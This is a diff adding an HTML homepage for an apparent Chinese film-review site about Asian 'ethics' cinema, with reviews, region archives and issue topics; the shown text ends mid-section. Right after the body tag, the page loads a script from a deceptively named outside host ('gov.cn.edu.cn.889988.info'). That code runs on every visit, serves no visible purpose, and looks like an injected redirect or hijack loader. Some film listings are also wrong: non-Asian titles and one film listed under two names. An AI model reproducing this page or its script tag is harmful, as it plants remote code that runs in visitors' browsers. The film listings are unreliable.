@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="亚洲伦理电影网 - 专注收录与品鉴亚洲各国探讨家庭、人性、道德、社会议题的深度伦理题材电影，以影评为核心，理性解读东方人情社会与人性边界。">
+<meta name="keywords" content="亚洲伦理电影网,yazhoulunlidianyingwang,亚洲伦理电影,伦理片,人性电影,道德伦理,家庭伦理,亚洲电影,东方电影,深度影评">
+<meta name="author" content="亚洲伦理电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="亚洲伦理电影网 - 品鉴亚洲人性光影，解读东方人情社会">
+<meta property="og:description" content="专注收录与品鉴亚洲各国探讨家庭、人性、道德、社会议题的深度伦理题材电影，以影评为核心的理性观影平台。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yazhoulunlidianyingwang-wap.github.io">
+<meta name="theme-color" content="#0d0a08">
+<title>亚洲伦理电影网 - 品鉴亚洲人性光影，解读东方人情社会 | yazhoulunlidianyingwang-wap</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --ink:#0d0a08;--ink2:#14100d;--ink3:#1c1612;
+  --paper:#f4ece2;--paper2:#e8dccb;--soft:#d6c6b0;--mute:#a39380;--mute2:#7a6c5c;
+  --carmine:#9e2b25;--carmine2:#c0392b;--vermilion:#e06b4d;--plum:#6b3a4a;--gold:#c9a24a;
+  --line:rgba(201,162,74,0.26);--line2:rgba(244,236,226,0.1);--line3:rgba(244,236,226,0.06);
+  --r:8px;--R:16px;
+  --sf:"PingFang SC","Microsoft YaHei","HarmonyOS Sans SC","WenQuanYi Micro Hei",system-ui,sans-serif;
+  --ser:"Songti SC","SimSun","Noto Serif CJK SC",STSong,"Source Han Serif SC",serif;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{font-family:var(--sf);background:var(--ink);color:var(--paper);line-height:1.9;overflow-x:hidden;}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+button{cursor:pointer;border:none;background:none;color:inherit;font-family:var(--sf);}
+img{max-width:100%;display:block;}
+::selection{background:var(--carmine);color:#f4ece2;}
+::-webkit-scrollbar{width:7px;height:7px;}
+::-webkit-scrollbar-thumb{background:var(--carmine);border-radius:4px;}
+
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;}
+.bg .wash{position:absolute;inset:0;background:radial-gradient(900px 600px at 82% 12%,rgba(158,43,37,0.22),transparent 60%),radial-gradient(700px 500px at 8% 88%,rgba(107,58,74,0.28),transparent 60%);}
+.bg .grain{position:absolute;inset:0;opacity:0.05;background-image:repeating-linear-gradient(0deg,transparent,transparent 1px,rgba(244,236,226,0.6) 1px,rgba(244,236,226,0.6) 2px);}
+main,header,footer{position:relative;z-index:1;}
+.wrap{max-width:1240px;margin:0 auto;padding:0 24px;}
+
+/* ===== 顶部 ===== */
+.top{position:sticky;top:0;z-index:100;background:rgba(13,10,8,0.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line3);}
+.topin{max-width:1240px;margin:0 auto;padding:13px 24px;display:flex;align-items:center;justify-content:space-between;gap:20px;}
+.logo{display:flex;align-items:baseline;gap:11px;}
+.logo .seal{width:34px;height:34px;border-radius:6px;background:var(--carmine);display:flex;align-items:center;justify-content:center;font-family:var(--ser);font-size:16px;color:var(--paper);box-shadow:0 4px 14px rgba(158,43,37,0.4);flex-shrink:0;}
+.logo b{font-size:18px;font-weight:800;letter-spacing:0.3px;}
+.logo em{font-style:normal;font-size:10px;color:var(--mute);font-family:var(--ser);letter-spacing:0.4px;}
+.nav{display:flex;align-items:center;gap:2px;}
+.nav a{padding:8px 13px;border-radius:6px;font-size:13px;font-weight:600;color:var(--soft);transition:.2s;position:relative;}
+.nav a:hover,.nav a.on{color:var(--paper);}
+.nav a.on::after{content:'';position:absolute;left:13px;right:13px;bottom:2px;height:2px;background:var(--vermilion);}
+.nav a.act{margin-left:10px;padding:9px 18px;border-radius:6px;font-size:13px;font-weight:800;background:var(--carmine);color:#f4ece2;transition:.25s;}
+.nav a.act:hover{background:var(--carmine2);transform:translateY(-1px);}
+.burg{display:none;width:42px;height:42px;border-radius:7px;border:1px solid var(--line2);align-items:center;justify-content:center;flex-direction:column;gap:5px;}
+.burg span{width:18px;height:2px;background:var(--paper);border-radius:2px;}
+
+/* ===== Hero ===== */
+.hero{padding:96px 0 72px;border-bottom:1px solid var(--line3);}
+.hwrap{display:grid;grid-template-columns:1.1fr 1fr;gap:64px;align-items:center;}
+.htxt .sealrow{display:flex;align-items:center;gap:14px;margin-bottom:24px;}
+.htxt .sealrow .hor{width:42px;height:1px;background:var(--line);}
+.htxt .sealrow .kicker{font-family:var(--ser);font-size:12px;color:var(--vermilion);letter-spacing:3px;}
+.htxt h1{font-family:var(--ser);font-size:clamp(36px,5.6vw,56px);font-weight:700;line-height:1.32;letter-spacing:1px;}
+.htxt h1 .it{color:var(--vermilion);}
+.htxt h1 .sm{display:block;font-family:var(--sf);font-size:clamp(13px,1.9vw,15.5px);font-weight:400;color:var(--mute);margin-top:20px;line-height:1.95;max-width:520px;letter-spacing:0;font-style:normal;}
+.htxt .rule{width:60px;height:3px;background:var(--carmine);margin:26px 0;}
+.hstats{display:flex;gap:52px;padding-top:26px;border-top:1px solid var(--line3);}
+.hstats .s .n{font-family:var(--ser);font-size:27px;font-weight:700;color:var(--paper);}
+.hstats .s .l{font-size:11.5px;color:var(--mute);margin-top:2px;font-family:var(--ser);letter-spacing:1px;}
+.btns{display:flex;gap:14px;flex-wrap:wrap;margin-top:30px;}
+.b1{display:inline-flex;align-items:center;gap:8px;padding:13px 26px;border-radius:6px;font-size:14px;font-weight:800;transition:.25s;}
+.b-go{background:var(--carmine);color:#f4ece2;box-shadow:0 12px 30px rgba(158,43,37,0.34);}
+.b-go:hover{background:var(--carmine2);transform:translateY(-2px);box-shadow:0 16px 38px rgba(158,43,37,0.44);}
+.b-gh{background:transparent;border:1px solid var(--line2);color:var(--soft);}
+.b-gh:hover{border-color:var(--vermilion);color:var(--vermilion);}
+/* 印章陈列 */
+.seals{position:relative;border-radius:var(--R);padding:38px 30px;background:linear-gradient(165deg,var(--ink2),var(--ink3));border:1px solid var(--line2);}
+.seals .corner{position:absolute;width:22px;height:22px;border:1.5px solid var(--gold);opacity:0.6;}
+.seals .c1{top:16px;left:16px;border-right:none;border-bottom:none;}
+.seals .c2{top:16px;right:16px;border-left:none;border-bottom:none;}
+.seals .c3{bottom:16px;left:16px;border-right:none;border-top:none;}
+.seals .c4{bottom:16px;right:16px;border-left:none;border-top:none;}
+.seals .lab{font-family:var(--ser);font-size:11.5px;color:var(--mute);letter-spacing:4px;text-align:center;margin-bottom:26px;}
+.seals .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.sealcard{text-align:center;}
+.sealcard .sq{width:100%;aspect-ratio:3/4;border-radius:6px;position:relative;overflow:hidden;border:1px solid var(--line2);background:linear-gradient(160deg,var(--a),var(--b));}
+.sealcard .sq span{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--ser);font-size:clamp(15px,2.5vw,19px);font-weight:700;color:var(--paper);text-align:center;padding:10px;letter-spacing:1px;}
+.sealcard .sq i{position:absolute;top:9px;right:9px;font-family:var(--ser);font-style:normal;font-size:9px;color:var(--paper);opacity:0.7;letter-spacing:1px;}
+.sealcard .cap{font-family:var(--ser);font-size:12px;color:var(--soft);margin-top:11px;}
+.sealcard .yr{font-size:10.5px;color:var(--mute);font-family:var(--ser);}
+
+/* ===== 通用 ===== */
+.band{padding:100px 0;}
+.bd-top{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;margin-bottom:46px;}
+.eyeb{font-family:var(--ser);font-size:11.5px;color:var(--vermilion);letter-spacing:3px;font-weight:700;margin-bottom:9px;display:flex;align-items:center;gap:12px;}
+.eyeb .bar{width:28px;height:1.5px;background:var(--vermilion);}
+.hd{font-family:var(--ser);font-size:clamp(23px,4.2vw,35px);font-weight:700;line-height:1.45;letter-spacing:0.5px;}
+.hd em{color:var(--vermilion);font-style:normal;}
+.ds{font-size:13.5px;color:var(--mute);max-width:540px;margin-top:8px;}
+.more{font-family:var(--ser);font-size:12px;color:var(--vermilion);border:1px solid var(--line);padding:9px 16px;border-radius:40px;transition:.2s;white-space:nowrap;letter-spacing:1px;}
+.more:hover{background:var(--vermilion);color:var(--ink);}
+
+/* ===== 栏目一：精选影评（编辑手记） ===== */
+.review{background:var(--ink2);}
+.rvgrid{display:grid;grid-template-columns:1.15fr 1fr;gap:24px;}
+.rvcard{border-radius:var(--R);overflow:hidden;border:1px solid var(--line2);background:var(--ink3);transition:.35s;display:flex;flex-direction:column;}
+.rvcard:hover{border-color:var(--vermilion);transform:translateY(-5px);}
+.rvcard .head{display:flex;align-items:center;justify-content:space-between;padding:15px 20px;border-bottom:1px solid var(--line3);}
+.rvcard .head .who{display:flex;align-items:center;gap:10px;}
+.rvcard .head .av{width:32px;height:32px;border-radius:50%;background:var(--carmine);display:flex;align-items:center;justify-content:center;font-family:var(--ser);font-size:13px;color:var(--paper);}
+.rvcard .head .who b{font-size:12.5px;font-weight:700;}
+.rvcard .head .who em{font-style:normal;font-size:10.5px;color:var(--mute);font-family:var(--ser);}
+.rvcard .head .score{font-family:var(--ser);font-size:15px;color:var(--gold);font-weight:700;}
+.rvcard .cv{position:relative;aspect-ratio:16/9;background:linear-gradient(150deg,var(--a),var(--b));overflow:hidden;}
+.rvcard .cv .no{position:absolute;top:14px;left:14px;font-family:var(--ser);font-size:10.5px;color:var(--paper);border:1px solid rgba(244,236,226,0.5);padding:4px 10px;border-radius:3px;letter-spacing:1px;}
+.rvcard .cv .ti{position:absolute;left:20px;right:20px;bottom:16px;font-family:var(--ser);font-size:clamp(18px,3vw,23px);font-weight:700;color:var(--paper);letter-spacing:1px;}
+.rvcard .body{padding:20px 22px;flex:1;display:flex;flex-direction:column;}
+.rvcard .body h3{font-size:17.5px;font-weight:800;margin-bottom:9px;line-height:1.6;}
+.rvcard .body p{font-size:12.5px;color:var(--mute);line-height:1.95;flex:1;}
+.rvcard .body .iss{display:flex;gap:8px;margin-top:15px;padding-top:14px;border-top:1px dashed var(--line3);font-family:var(--ser);font-size:10.5px;color:var(--soft);flex-wrap:wrap;}
+.rvcard .body .iss em{font-style:normal;padding:3px 9px;border-radius:3px;background:var(--ink2);border:1px solid var(--line3);}
+
+/* ===== 栏目二：地域档案（亚洲地图式网格） ===== */
+.region{background:var(--ink);}
+.reggrid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.reg{cursor:pointer;border-radius:var(--r);overflow:hidden;border:1px solid var(--line2);background:var(--ink2);transition:.3s;position:relative;}
+.reg:hover{border-color:var(--vermilion);transform:translateY(-4px);}
+.reg .cv{position:relative;height:130px;background:linear-gradient(150deg,var(--a),var(--b));overflow:hidden;}
+.reg .cv .cn{position:absolute;left:16px;bottom:12px;font-family:var(--ser);font-size:19px;font-weight:700;color:var(--paper);letter-spacing:2px;}
+.reg .cv .en{position:absolute;right:14px;top:12px;font-family:var(--ser);font-size:9.5px;color:rgba(244,236,226,0.75);letter-spacing:1.5px;}
+.reg .cv .fl{position:absolute;top:12px;left:14px;font-family:var(--ser);font-size:9.5px;color:var(--paper);border:1px solid rgba(244,236,226,0.5);padding:3px 8px;border-radius:3px;}
+.reg .info{padding:15px 17px;}
+.reg .info .n{font-size:11.5px;color:var(--mute);font-family:var(--ser);margin-bottom:6px;}
+.reg .info h4{font-size:14.5px;font-weight:800;margin-bottom:6px;}
+.reg .info p{font-size:11.5px;color:var(--mute2);line-height:1.8;}
+
+/* ===== 栏目三：议题图谱（伦理议题分支） ===== */
+.issue{background:var(--ink2);}
+.issgrid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;}
+.issc{border-radius:var(--R);padding:22px 24px;border:1px solid var(--line2);background:linear-gradient(155deg,var(--ink3),var(--ink2));transition:.3s;}
+.issc:hover{border-color:var(--vermilion);}
+.issc .topr{display:flex;align-items:center;gap:14px;margin-bottom:14px;}
+.issc .no{font-family:var(--ser);font-size:12px;color:var(--vermilion);border:1px solid var(--line);width:32px;height:32px;flex-shrink:0;border-radius:50%;display:flex;align-items:center;justify-content:center;}
+.issc h3{font-size:16.5px;font-weight:800;}
+.issc p{font-size:12.5px;color:var(--mute);line-height:1.9;}
+.issc .films{display:flex;gap:7px;flex-wrap:wrap;margin-top:14px;padding-top:13px;border-top:1px dashed var(--line3);}
+.issc .films a{font-family:var(--ser);font-size:10.5px;color:var(--soft);border:1px solid var(--line3);padding:4px 10px;border-radius:3px;transition:.2s;}
+.issc .films a:hover{color:var(--vermilion);border-color:var(--vermilion);}
+
+/* ===== 栏目四：导演谱系（头像+代表作） ===== */
+.tree{background:var(--ink);}
+.treegrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(205px,1fr));gap:18px;}
+.treec{border-radius:var(--r);overflow:hidden;border:1px solid var(--line2);background:var(--ink2);transition:.3s;}
+.treec:hover{border-color:var(--vermilion);}
+.treec .av{position:relative;aspect-ratio:1/1;background:linear-gradient(150deg,var(--a),var(--b));overflow:hidden;}
+.treec .av .ini{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--ser);font-size:38px;font-weight:700;color:var(--paper);}
+.treec .av .rg{position:absolute;top:12px;left:12px;font-family:var(--ser);font-size:9.5px;color:var(--paper);border:1px solid rgba(244,236,226,0.5);padding:3px 8px;border-radius:3px;letter-spacing:1px;}
+.treec .info{padding:16px 18px;}
+.treec .info h4{font-size:15.5px;font-weight:800;margin-bottom:4px;}
+.treec .info .en{font-family:var(--ser);font-size:10.5px;color:var(--mute);margin-bottom:9px;}
+.treec .info .fl{font-size:11.5px;color:var(--soft);line-height:1.75;}
+.treec .info .fl b{color:var(--vermilion);font-weight:700;}
+
+/* ===== 栏目五：观点现场（引言墙） ===== */
+.quote{background:var(--ink2);}
+.qgrid{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
+.qcard{border-radius:var(--R);padding:26px 26px;border:1px solid var(--line2);background:var(--ink3);position:relative;transition:.3s;}
+.qcard:hover{border-color:var(--vermilion);}
+.qcard::before{content:'"';position:absolute;top:8px;left:18px;font-family:var(--ser);font-size:52px;color:var(--carmine);opacity:0.5;line-height:1;}
+.qcard p{font-family:var(--ser);font-size:14.5px;font-weight:700;line-height:1.95;color:var(--paper);margin-bottom:16px;padding-top:14px;}
+.qcard .src{display:flex;align-items:center;gap:11px;padding-top:14px;border-top:1px solid var(--line3);}
+.qcard .src .av{width:30px;height:30px;border-radius:50%;background:var(--plum);display:flex;align-items:center;justify-content:center;font-family:var(--ser);font-size:12px;color:var(--paper);flex-shrink:0;}
+.qcard .src b{font-size:12px;font-weight:700;}
+.qcard .src em{font-style:normal;font-size:10.5px;color:var(--mute);font-family:var(--ser);}
+
+/* ===== 栏目六：数据看板 ===== */
+.dash{background:var(--ink);}
+.dashgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px;margin-bottom:22px;}
+.dc{border-radius:var(--R);padding:22px;border:1px solid var(--line2);background:var(--ink2);transition:.3s;}
+.dc:hover{border-color:var(--vermilion);}
+.dc .l{font-family:var(--ser);font-size:11px;color:var(--mute);letter-spacing:2px;}
+.dc .v{font-family:var(--ser);font-size:clamp(25px,3.4vw,32px);font-weight:700;color:var(--paper);margin:9px 0 5px;}
+.dc .v i{font-style:normal;color:var(--vermilion);}
+.dc .d{font-family:var(--ser);font-size:10.5px;color:var(--mute2);}
+.barwrap{display:flex;flex-direction:column;gap:14px;}
+.barow{display:grid;grid-template-columns:110px 1fr 56px;gap:16px;align-items:center;}
+.barow .lb{font-size:12px;color:var(--soft);}
+.barow .track{height:8px;border-radius:4px;background:var(--ink3);overflow:hidden;border:1px solid var(--line3);}
+.barow .fill{height:100%;border-radius:4px;background:linear-gradient(90deg,var(--carmine),var(--vermilion));}
+.barow .vl{font-family:var(--ser);font-size:12px;color:var(--vermilion);text-align:right;}
+
+/* ===== 底部 ===== */
+.foot{background:var(--ink2);border-top:1px solid var(--line2);padding:64px 0 24px;}
+.fin{max-width:1240px;margin:0 auto;padding:0 24px;}
+.flay{display:grid;grid-template-columns:1.8fr 1fr 1fr 1fr;gap:44px;margin-bottom:38px;}
+.logo.fb{margin-bottom:15px;}
+.logo.fb b{font-size:19px;}
+.logo.fb em{display:block;margin-top:5px;}
+.fabout{font-size:12.5px;color:var(--soft);line-height:1.95;max-width:400px;}
+.fcol h5{font-family:var(--ser);font-size:12px;color:var(--vermilion);margin-bottom:16px;font-weight:800;letter-spacing:2px;}
+.fcol li{padding:5px 0;}
+.fcol a{font-size:12.5px;color:var(--mute);transition:.2s;}
+.fcol a:hover{color:var(--vermilion);}
+.fbot{padding-top:24px;border-top:1px solid var(--line3);display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:11.5px;color:var(--mute2);}
+.fbot a{color:var(--mute2);}
+.fbot a:hover{color:var(--vermilion);}
+.fbot .u{color:var(--vermilion);font-family:var(--ser);font-weight:700;}
+
+.rv{opacity:0;transform:translateY(24px);transition:opacity .55s ease,transform .55s ease;}
+.rv.in{opacity:1;transform:none;}
+@media (prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;}}
+
+@media (max-width:1000px){
+  .nav{display:none;}
+  .burg{display:flex;}
+  .hwrap{grid-template-columns:1fr;gap:40px;}
+  .rvgrid{grid-template-columns:1fr;}
+  .reggrid{grid-template-columns:repeat(2,1fr);}
+  .treegrid{grid-template-columns:repeat(2,1fr);}
+  .qgrid{grid-template-columns:1fr;}
+  .seals .grid{grid-template-columns:repeat(3,1fr);gap:16px;}
+}
+@media (max-width:768px){
+  .band{padding:70px 0;}
+  .hero{padding:60px 0 46px;}
+  .topin{padding:11px 16px;}
+  .wrap,.fin{padding:0 16px;}
+  .logo em{display:none;}
+  .nav a.act{display:none;}
+  .bd-top{align-items:flex-start;}
+  .hstats{gap:30px;}
+  .issgrid{grid-template-columns:1fr;}
+  .barow{grid-template-columns:80px 1fr 44px;gap:11px;font-size:11px;}
+  .flay{grid-template-columns:1fr 1fr;gap:30px;}
+}
+@media (max-width:440px){
+  .htxt h1{font-size:33px;}
+  .reggrid,.treegrid{grid-template-columns:1fr;}
+  .flay{grid-template-columns:1fr;}
+  .seals .grid{grid-template-columns:1fr;gap:24px;}
+  .btns .b1{padding:12px 20px;font-size:13px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<div class="bg"><div class="wash"></div><div class="grain"></div></div>
+
+<header class="top">
+  <div class="topin">
+    <a href="#top" class="logo"><span class="seal">亞</span><div><b>亚洲伦理电影网</b><em>yazhoulunlidianyingwang</em></div></a>
+    <nav class="nav" id="nav">
+      <a href="#top" class="on">首页</a>
+      <a href="#review">精选影评</a>
+      <a href="#region">地域档案</a>
+      <a href="#issue">议题图谱</a>
+      <a href="#tree">导演谱系</a>
+      <a href="#quote">观点现场</a>
+      <a href="#top" class="act">阅 · 影评</a>
+    </nav>
+    <button class="burg" id="burg" aria-label="菜单"><span></span><span></span><span></span></button>
+  </div>
+</header>
+
+<main id="top">
+
+<!-- ===== Hero ===== -->
+<section class="hero">
+  <div class="wrap">
+    <div class="hwrap">
+      <div class="htxt rv">
+        <div class="sealrow"><span class="hor"></span><span class="kicker">東方 · 人情 · 光影</span><span class="hor"></span></div>
+        <h1>以影为镜<br>照见<span class="it">东方人情</span>的<br>幽微与温度</h1>
+        <span class="sm">亚洲伦理电影网（yazhoulunlidianyingwang-wap.github.io）专注收录与品鉴亚洲各国探讨家庭、人性、道德与社会议题的深度伦理题材电影，以影评为核心，理性解读人性边界与东方人情社会。</span>
+        <div class="rule"></div>
+        <div class="hstats">
+          <div class="s"><div class="n">1,860</div><div class="l">收录影片</div></div>
+          <div class="s"><div class="n">240</div><div class="l">深度影评</div></div>
+          <div class="s"><div class="n">12</div><div class="l">国家地区</div></div>
+        </div>
+        <div class="btns">
+          <a href="#review" class="b1 b-go">閱 影评</a>
+          <a href="#region" class="b1 b-gh">按地区浏览</a>
+        </div>
+      </div>
+
+      <div class="seals rv">
+        <span class="corner c1"></span><span class="corner c2"></span><span class="corner c3"></span><span class="corner c4"></span>
+        <div class="lab">— 本月 · 四部必读 —</div>
+        <div class="grid">
+          <div class="sealcard"><div class="sq" style="--a:#9e2b25;--b:#6b1d18"><span>楢山节考</span><i>1983</i></div><div class="cap">楢山節考</div><div class="yr">日本 · 今村昌平</div></div>
+          <div class="sealcard"><div class="sq" style="--a:#6b3a4a;--b:#4a2531"><span>燃烧</span><i>2018</i></div><div class="cap">버닝</div><div class="yr">韩国 · 李沧东</div></div>
+          <div class="sealcard"><div class="sq" style="--a:#c9a24a;--b:#9a772c"><span>一一</span><i>2000</i></div><div class="cap">一一</div><div class="yr">台湾 · 杨德昌</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：精选影评 ===== -->
+<section class="band review rv" id="review">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>精选影评</span><h2 class="hd">以影评为核心 · <em>理性解读</em>每一部</h2><p class="ds">编辑部深度撰文，从文本、镜头到伦理议题层层拆解</p></div>
+      <a href="#" class="more">全部影评 →</a>
+    </div>
+
+    <div class="rvgrid">
+      <a href="#" class="rvcard"><div class="head"><div class="who"><span class="av">序</span><div><b>影评编辑部</b><em>主编 · 序言</em></div></div><span class="score">9.1</span></div><div class="cv" style="--a:#9e2b25;--b:#6b1d18"><span class="no">NO.01 · 深度长评</span><span class="ti">楢山节考</span></div><div class="body"><h3>当"弃老"成为仪式，人性还剩下多少温情？</h3><p>今村昌平以冷峻到近乎残酷的镜头，把信浓山村的"弃老"习俗拍成了一场庄严的送葬。这不是猎奇，而是一把解剖刀，剖开贫困年代生存与伦理的尖锐冲突。</p><div class="iss"><em>家庭伦理</em><em>生死观</em><em>日本</em></div></div></a>
+      <a href="#" class="rvcard"><div class="head"><div class="who"><span class="av">默</span><div><b>默存</b><em>特约撰稿</em></div></div><span class="score">8.8</span></div><div class="cv" style="--a:#6b3a4a;--b:#4a2531"><span class="no">NO.02 · 文本细读</span><span class="ti">燃烧</span></div><div class="body"><h3>三个年轻人的空虚，烧尽了什么？</h3><p>李沧东改编福克纳与村上春树，把"烧仓房"变成阶级与欲望的隐喻。全片最恐怖的不是失踪，而是那个始终没有答案的"塑料大棚"。</p><div class="iss"><em>阶级</em><em>悬疑</em><em>韩国</em></div></div></a>
+      <a href="#" class="rvcard"><div class="head"><div class="who"><span class="av">青</span><div><b>青木</b><em>资深影评人</em></div></div><span class="score">8.6</span></div><div class="cv" style="--a:#c9a24a;--b:#9a772c"><span class="no">NO.03 · 导演论</span><span class="ti">一一</span></div><div class="body"><h3>杨德昌用三个小时，讲完了人的一生</h3><p>从婚礼到葬礼，从童年到暮年，一一是华语电影关于家庭与生命最完整的史诗。每个人都能在里面，找到自己的那一面镜子。</p><div class="iss"><em>家庭</em><em>人生</em><em>台湾</em></div></div></a>
+      <a href="#" class="rvcard"><div class="head"><div class="who"><span class="av">竹</span><div><b>竹影</b><em>编辑</em></div></div><span class="score">8.4</span></div><div class="cv" style="--a:#3d6b5a;--b:#2a4a3d"><span class="no">NO.04 · 女性视角</span><span class="ti">密阳</span></div><div class="body"><h3>信仰崩塌之后，原谅是否可能？</h3><p>李沧东镜头下的全度妍，把一位母亲从丧子之痛到信仰狂热再到幻灭的全过程，演成了韩国电影史上最令人心碎的表演之一。</p><div class="iss"><em>信仰</em><em>女性</em><em>宽恕</em></div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：地域档案 ===== -->
+<section class="band region rv" id="region">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>地域档案</span><h2 class="hd">亚洲各国 · <em>各有各的人情</em></h2><p class="ds">按国家与地区梳理伦理电影脉络，看见不同文化下的人性表达</p></div>
+      <a href="#" class="more">完整地域 →</a>
+    </div>
+
+    <div class="reggrid">
+      <a href="#" class="reg"><div class="cv" style="--a:#9e2b25;--b:#6b1d18"><span class="fl">日本</span><span class="en">JAPAN</span><span class="cn">日本</span></div><div class="info"><div class="n">218 部 · 46 位导演</div><h4>家庭与"耻感"的仪式化表达</h4><p>从今村昌平到是枝裕和，日本伦理片擅长在克制中逼近人性深处。</p></div></a>
+      <a href="#" class="reg"><div class="cv" style="--a:#6b3a4a;--b:#4a2531"><span class="fl">韩国</span><span class="en">KOREA</span><span class="cn">韩国</span></div><div class="info"><div class="n">195 部 · 38 位导演</div><h4>阶级、欲望与儒家秩序的撕裂</h4><p>李沧东、金基德、洪常秀，各自撕开韩国社会的不同伤口。</p></div></a>
+      <a href="#" class="reg"><div class="cv" style="--a:#3d6b5a;--b:#2a4a3d"><span class="fl">中国</span><span class="en">CHINA</span><span class="cn">华语</span></div><div class="info"><div class="n">312 部 · 71 位导演</div><h4>大家庭伦理与时代变迁</h4><p>从杨德昌到贾樟柯，华语伦理片映照着家庭与社会的剧烈转型。</p></div></a>
+      <a href="#" class="reg"><div class="cv" style="--a:#c9a24a;--b:#9a772c"><span class="fl">伊朗</span><span class="en">IRAN</span><span class="cn">伊朗</span></div><div class="info"><div class="n">96 部 · 22 位导演</div><h4>宗教律法下的道德困境</h4><p>阿巴斯与法拉哈迪用极简叙事，拷问信任、谎言与道德边界。</p></div></a>
+      <a href="#" class="reg"><div class="cv" style="--a:#4a5b8a;--b:#34406a"><span class="fl">泰国</span><span class="en">THAILAND</span><span class="cn">泰国</span></div><div class="info"><div class="n">78 部 · 19 位导演</div><h4>小乘佛教的慈悲与业报</h4><p>阿彼察邦用梦境般的影像，把伦理议题带入神秘主义场域。</p></div></a>
+      <a href="#" class="reg"><div class="cv" style="--a:#8a5b8a;--b:#654065"><span class="fl">印度</span><span class="en">INDIA</span><span class="cn">印度</span></div><div class="info"><div class="n">134 部 · 31 位导演</div><h4>种姓、婚姻与家庭义务</h4><p>从达达·萨赫布到当代新电影，印度伦理片直面古老秩序的裂痕。</p></div></a>
+      <a href="#" class="reg"><div class="cv" style="--a:#a86a4a;--b:#7d4f35"><span class="fl">越南</span><span class="en">VIETNAM</span><span class="cn">越南</span></div><div class="info"><div class="n">62 部 · 15 位导演</div><h4>战争记忆与家庭重聚</h4><p>陈英雄用细腻光影，讲述战后家庭的离散与和解。</p></div></a>
+      <a href="#" class="reg"><div class="cv" style="--a:#5b6b8a;--b:#414d66"><span class="fl">其他</span><span class="en">OTHERS</span><span class="cn">更多</span></div><div class="info"><div class="n">165 部 · 48 位导演</div><h4>土耳其 / 菲律宾 / 印尼</h4><p>持续扩展亚洲伦理电影版图，收录更多边缘地区的人文佳作。</p></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：议题图谱 ===== -->
+<section class="band issue rv" id="issue">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>议题图谱</span><h2 class="hd">伦理的命题 · <em>人性在何处交锋</em></h2><p class="ds">把抽象的道德困境，拆解成一个个可讨论的议题</p></div>
+      <a href="#" class="more">全部议题 →</a>
+    </div>
+
+    <div class="issgrid">
+      <div class="issc"><div class="topr"><span class="no">壹</span><h3>家庭与代际</h3></div><p>父母与子女之间的爱，何时变成了债？赡养、遗弃、缺席的父亲，东亚家庭最普遍的伦理命题。</p><div class="films"><a href="#">楢山节考</a><a href="#">步履不停</a><a href="#">一一</a><a href="#">东京物语</a></div></div>
+      <div class="issc"><div class="topr"><span class="no">贰</span><h3>婚姻与忠诚</h3></div><p>一纸婚约究竟约束了什么？出轨、丧偶、重组家庭，亲密关系里的道德边界如何划定。</p><div class="films"><a href="#">恐怖分子</a><a href="#">密阳</a><a href="#">消失的爱人</a></div></div>
+      <div class="issc"><div class="topr"><span class="no">叁</span><h3>阶级与欲望</h3></div><p>贫穷是否天然地靠近罪恶？当欲望没有出口，人性会在哪一个瞬间溃败。</p><div class="films"><a href="#">燃烧</a><a href="#">寄生虫</a><a href="#">雪国列车</a></div></div>
+      <div class="issc"><div class="topr"><span class="no">肆</span><h3>信仰与宽恕</h3></div><p>当宗教律法与人情冲突，原谅是美德还是软弱？受害者与原谅者的双重困境。</p><div class="films"><a href="#">密阳</a><a href="#">一次别离</a><a href="#">纳德与西敏</a></div></div>
+      <div class="issc"><div class="topr"><span class="no">伍</span><h3>生死与尊严</h3></div><p>谁有权决定一个人的死亡？安乐死、弃老、临终关怀，生命伦理的终极追问。</p><div class="films"><a href="#">楢山节考</a><a href="#">小偷家族</a><a href="#">入殓师</a></div></div>
+      <div class="issc"><div class="topr"><span class="no">陆</span><h3>性别与身体</h3></div><p>女性身体的自主权在哪里？从被凝视到自我觉醒，亚洲女性电影的成长轨迹。</p><div class="films"><a href="#">钢琴课</a><a href="#">密阳</a><a href="#">沙漠之花</a></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：导演谱系 ===== -->
+<section class="band tree rv" id="tree">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>导演谱系</span><h2 class="hd">镜头背后 · <em>那些反复追问的人</em></h2><p class="ds">亚洲伦理电影的代表导演，及其不可错过的代表作</p></div>
+      <a href="#" class="more">完整名录 →</a>
+    </div>
+
+    <div class="treegrid">
